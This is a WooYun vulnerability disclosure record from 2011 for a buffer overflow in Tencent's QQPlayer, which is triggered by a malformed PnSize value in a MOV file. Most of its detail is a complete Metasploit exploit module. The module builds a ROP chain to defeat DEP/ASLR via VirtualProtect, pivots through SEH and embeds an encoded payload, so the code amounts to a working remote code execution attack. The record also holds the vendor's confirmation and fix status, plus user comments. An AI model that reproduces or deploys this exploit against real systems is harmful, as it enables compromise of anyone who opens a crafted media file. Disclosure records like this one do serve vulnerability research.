{"id": 21704, "wybug_id": "wooyun-2011-03368", "wybug_title": "QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS", "wybug_corp": "腾讯", "wybug_author": "hellok", "wybug_date": "2011-11-21 16:07", "wybug_open_date": "2011-12-21 16:08", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "远程代码执行", "安全策略绕过", "远程缓冲区溢出", "客户端安全", "媒体库漏洞", "漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-11-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-12-21：\t细节向公众公开  简要描述： qq播放器核心版本过低,在处理畸形MOV文件时,缓冲区溢出，可覆盖SEH任意代码执行不愧为山寨之王http://115.com/file/cl3naedvhttp://115.com/file/aqu3qzmk 详细说明：  \n# Exploit Title: QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS# Date: 2011,11,21# Author: hellok# Software Link: http://dl_dir.qq.com/invc/qqplayer/QQPlayer_Setup_32_845.exe# Version: 32_845(lastest)# Tested on: WIN7require 'msf/core'class Metasploit3 < Msf::Exploit::Remote\tinclude Msf::Exploit::FILEFORMAT\tdef initialize(info = {})\t\tsuper(update_info(info,\t\t\t'Name'           => 'QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS',\t\t\t'Description'    => %q{\t\t\t\t\tThis module exploits a vulnerability in QQPLAYER Player 3.2.\t\t\t\tWhen opening a .mov file containing a specially crafted PnSize value, an attacker\t\t\t\tmay be able to execute arbitrary code.\t\t\t},\t\t\t'License'        => MSF_LICENSE,\t\t\t'Author'         =>\t\t\t\t[\t\t\t\t\t'hellok',  #special thank corelanc0d3r for 'mona'\t\t\t\t],\t\t\t'References'     =>\t\t\t\t[\t\t\t\t],\t\t\t'DefaultOptions' =>\t\t\t\t{\t\t\t\t\t'EXITFUNC' => 'process',\t\t\t\t\t'DisablePayloadHandler' => 'true',\t\t\t\t},\t\t\t'Payload'        =>\t\t\t\t{\t\t\t\t\t'Space'          => 750,\t\t\t\t\t'BadChars'       => \"\",  #Memcpy\t\t\t\t\t'EncoderType'    => Msf::Encoder::Type::AlphanumUpper,\t\t\t\t\t'DisableNops'    =>  'True',\t\t\t\t\t'PrependEncoder' => \"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\",\t\t\t\t\t'EncoderOptions' =>\t\t\t\t\t\t{\t\t\t\t\t\t\t'BufferRegister' => 'ECX',\t\t\t\t\t\t},\t\t\t\t},\t\t\t'Platform' => 'win',\t\t\t'Targets'        =>\t\t\t\t[\t\t\t\t\t[ 'Windows 7', { 'Ret' => 0x67664cde } ],\t\t\t\t],\t\t\t'Privileged'     => false,\t\t\t'DisclosureDate' => '11 21 2011',\t\t\t'DefaultTarget'  => 0))\t\tregister_options(\t\t\t[\t\t\t\tOptString.new('FILENAME',   [ false, 'The file name.',  'msf.mov' ]),\t\t\t], self.class)\tend\tdef exploit\t\t# !mona rop\t\trop_gadgets = \t\t[\t\t\t\t\t\t0x00418007,\t# POP ECX # RETN (QQPlayer.exe)\t\t\t0x12345678,\t\t\t0x67664CE4,   \t\t\t0x01020304,\t\t\t0x10203040,\t\t\t0x22331122,\t\t\t0x23456789,\t\t\t\t\t\t0x00418007,\t# POP ECX # RETN (QQPlayer.exe)\t\t\t0x00a9c18c,\t# <- *&VirtualProtect() \t\t\t0x0054f100,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN (QQPlayer.exe)\t\t\t#0x008e750c, LEA ESI,EAX # RETN (QQPlayer.exe)\t\t\t0x008cf099,\t# XCHG EAX,ESI # RETN\t\t\t\t\t\t0x6497aaad,\t# POP EBP # RETN (avformat-52.dll)\t\t\t0x100272bf,\t# ptr to 'call esp' (from i18nu.dll)\t\t\t0x005fc00b,\t# POP EBX # RETN (QQPlayer.exe)\t\t\t0x00000331,\t# <- change size to mark as executable if needed (-> ebx)\t\t\t0x00418007,\t# POP ECX # RETN (QQPlayer.exe)\t\t\t0x63d18000,\t# RW pointer (lpOldProtect) (-> ecx)\t\t\t0x63d05001,\t# POP EDI # RETN (avutil-49.dll)\t\t\t0x63d05002,\t# ROP NOP (-> edi)\t\t\t0x008bf00b,\t# POP EDX # RETN (QQPlayer.exe)\t\t\t0x00000040,\t# newProtect (0x40) (-> edx)\t\t\t0x00468800,\t# POP EAX # RETN (QQPlayer.exe)\t\t\t0x90909090,\t# NOPS (-> eax)\t\t\t0x008bad5c,\t# PUSHAD # RETN (QQPlayer.exe)\t\t# rop chain generated by mona.py\t\t# note : this chain may not work out of the box\t\t# you may have to change order or fix some gadgets,\t\t# but it should give you a head start\t\t].pack(\"V*\")\t\tstackpivot = [target.ret].pack('L')\t\tbuffer =rand_text_alpha_upper(90)#2\t\tbuffer << rop_gadgets\t\tbuffer << payload.encoded\t\tjunk = rand_text_alpha_upper(2306 - buffer.length)\t\tbuffer << junk\t\tbuffer << stackpivot\t\tbuffer << rand_text_alpha_upper(3000)#3000\t\tpath = File.join( Msf::Config.install_root, \"data\", \"exploits\", \"CVE-2011-0257.mov\" )\t\tfd = File.open(path, \"rb\" )\t\tsploit = fd.read(fd.stat.size)\t\tfd.close\t\tsploit << buffer\t\tfile_create(sploit)\tendend\n   漏洞证明：     修复方案：  无   版权声明：转载请注明来源 hellok@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2011-11-21 18:10 厂商回复： 非常感谢你的报告，我们正在跟进。 最新状态： 2011-11-22：跟进中 2011-11-24：已修复  ", "replys": "漏洞评价：\n评论\n     2011-11-21 16:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我勒个去！    \n     2011-11-21 17:17 |    \t\tredzl \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | Let's exploit it!)\t\t \n  我勒个擦    \n     2011-11-21 18:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  本来@腾讯 就是山寨之王     \n     2011-11-23 12:24 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  要不要那么搞笑的    \n     2011-11-23 13:39 |    \t\t笨猪 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:13        | Jarett|最近忙，洞发得少。。)\t\t \n  太有喜感了，这吐槽    \n     2012-04-30 15:51 |    \t\tSay \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:4        | 谁又会鉴定谁正常？)\t\t \n  不愧为山寨之王。。哈哈哈     \n     2012-07-09 21:53 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  牛逼强货    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}